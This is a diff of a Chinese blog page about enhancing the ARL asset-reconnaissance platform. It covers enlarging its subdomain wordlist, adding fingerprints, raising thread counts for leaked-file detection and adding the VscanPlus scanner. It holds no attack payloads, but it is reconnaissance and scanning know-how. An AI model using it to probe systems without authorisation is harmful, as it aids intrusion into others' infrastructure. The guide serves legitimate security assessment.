 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker volume create --name=arl_db</span><br></pre></td></tr></table></figure></div>
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207105634491.png" class title="image-20241207105634491">
@@ -1374,7 +1480,7 @@
 
 
 
-<h2 id="优化增强"><a href="#优化增强" class="headerlink" title="优化增强"></a>优化增强</h2><h3 id="子域名字典扩容"><a href="#子域名字典扩容" class="headerlink" title="子域名字典扩容"></a>子域名字典扩容</h3><p>灯塔自带的字典仅包含两万个子域名，依赖这个字典进行扫描往往会漏掉一些潜在的子域名</p>
+<h1 id="优化增强"><a href="#优化增强" class="headerlink" title="优化增强"></a>优化增强</h1><h2 id="子域名字典扩容"><a href="#子域名字典扩容" class="headerlink" title="子域名字典扩容"></a>子域名字典扩容</h2><p>灯塔自带的字典仅包含两万个子域名，依赖这个字典进行扫描往往会漏掉一些潜在的子域名</p>
 <p>将准备好的子域名字典复制到 arl_worker 中，使⽤如下命令：</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker cp domain_2w.txt ID:/code/app/dicts/domain_2w.txt</span><br><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure></div>
 
@@ -1382,7 +1488,7 @@
 
 
 
-<h3 id="指纹增强"><a href="#指纹增强" class="headerlink" title="指纹增强"></a>指纹增强</h3><p>添加指纹，让灯塔拥有更强大的指纹，参考使用 ARL-Finger-ADD</p>
+<h2 id="指纹增强"><a href="#指纹增强" class="headerlink" title="指纹增强"></a>指纹增强</h2><p>添加指纹，让灯塔拥有更强大的指纹，参考使用 ARL-Finger-ADD</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/loecho-sec/ARL-Finger-ADD</span><br></pre></td></tr></table></figure></div>
 
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207120427341.png" class title="image-20241207120427341">
@@ -1400,7 +1506,7 @@
 
 
 
-<h3 id="文件泄露检测功能优化"><a href="#文件泄露检测功能优化" class="headerlink" title="文件泄露检测功能优化"></a>文件泄露检测功能优化</h3><p>源代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;fileLeak.py</p>
+<h2 id="文件泄露检测功能优化"><a href="#文件泄露检测功能优化" class="headerlink" title="文件泄露检测功能优化"></a>文件泄露检测功能优化</h2><p>源代码在 &#x2F;code&#x2F;app&#x2F;servers&#x2F;fileLeak.py</p>
 <img lazyload src="/images/loading.svg" data-src="/2025/03/05/%E8%B5%84%E4%BA%A7%E4%BE%A6%E5%AF%9F%E7%B3%BB%E7%BB%9F%E7%81%AF%E5%A1%94ARL%E4%BC%98%E5%8C%96/image-20241207173344511.png" class title="image-20241207173344511">
 
 <p>增加扫描的线程数</p>
@@ -1411,7 +1517,7 @@
 
 
 
-<h3 id="漏扫轻量化"><a href="#漏扫轻量化" class="headerlink" title="漏扫轻量化"></a>漏扫轻量化</h3><p>Nuclei 的核心逻辑是通过大量的 POC 模板 进行扫描，这种操作可能会对目标系统造成比较大的负面影响。</p>
+<h2 id="漏扫轻量化"><a href="#漏扫轻量化" class="headerlink" title="漏扫轻量化"></a>漏扫轻量化</h2><p>Nuclei 的核心逻辑是通过大量的 POC 模板 进行扫描，这种操作可能会对目标系统造成比较大的负面影响。</p>
 <p>通过增加轻型扫描工具，让灯塔系统更加完整，这里采用 Vscan 二开版本，选择合适的版本下载并上传至 Linux 服务器</p>
 <div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://github.com/youki992/VscanPlus</span><br></pre></td></tr></table></figure></div>
 
